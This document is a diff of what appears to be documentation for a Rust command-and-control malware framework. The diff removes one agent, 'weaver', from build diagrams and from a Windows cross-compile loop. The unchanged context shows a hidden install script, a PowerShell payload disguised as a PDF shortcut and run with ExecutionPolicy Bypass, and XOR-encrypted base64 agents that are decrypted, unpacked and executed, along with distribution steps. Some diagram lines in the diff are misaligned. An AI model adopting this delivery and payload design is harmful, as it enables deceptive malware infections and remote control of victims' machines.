@@ -38,7 +38,7 @@
 ┌─────────────────────────────────────────────────────────────┐
 │                     cargo build --release                    │
 │                                                             │
-│  queen ──── worker ──── drone ──── honeybee ──── weaver ──── swarm  │
+│  queen ──── worker ──── drone ──── honeybee ──── swarm            │
 │  c2-server ─── stinger                                       │
 └─────────────────────────────────────────────────────────────┘
                           │
@@ -49,8 +49,7 @@
               │  ├── worker           │
               │  ├── drone            │
               │  ├── honeybee         │
-              │  ├── weaver           │
-              │  ├── swarm            │
+                            │  ├── swarm            │
               │  ├── c2-server        │
               │  └── stinger          │
               └───────────────────────┘
@@ -124,8 +123,7 @@ scripts/
                                                   │ worker       │
                                                   │ drone        │
                                                   │ honeybee     │
-                                                  │ weaver       │
-                                                  │ swarm        │
+                                                                                                    │ swarm        │
                                                   │ c2-server    │
                                                   └──────────────┘
 ```
@@ -260,8 +258,7 @@ bash /mnt/.install.sh
         │  ├── worker  │
         │  ├── drone   │
         │  ├── honeybee│
-        │  ├── weaver  │
-        │  ├── swarm   │
+                │  ├── swarm   │
         │  └── c2-server│
         ╚══════════════╝
 ```
@@ -291,7 +288,6 @@ powershell -ExecutionPolicy Bypass -File D:\readme.pdf.lnk.ps1
 ║  worker|base64_data...                                            ║
 ║  drone|base64_data...                                             ║
 ║  honeybee|base64_data...                                          ║
-║  weaver|base64_data...                                            ║
 ║  swarm|base64_data...                                             ║
 ║  c2-server|base64_data...                                         ║
 ║                                                                   ║
@@ -491,7 +487,7 @@ Distribuir AMBOS archivos juntos:
 │  │  H4sIAAAAAAACA+4...       ◄── base64 del worker cifrado │  │
 │  │  B64EOF                                                   │  │
 │  │  }                                                        │  │
-│  │  ... (drone, honeybee, weaver, swarm, c2-server)          │  │
+│  │  ... (drone, honeybee, swarm, c2-server)                  │  │
 │  │                                                          │  │
 │  │  # Extracción + XOR decrypt + GZip + ejecución           │  │
 │  │  for agent in queen worker ...; do                       │  │
@@ -698,7 +694,7 @@ curl http://localhost:8444/health
 ```bash
 # 1. Cross-compile todos los agentes
 ./setup_cross.sh win
-for p in queen worker drone honeybee weaver swarm c2-server; do
+for p in queen worker drone honeybee swarm c2-server; do
     cargo build --release --target x86_64-pc-windows-gnu -p "$p"
 done
 
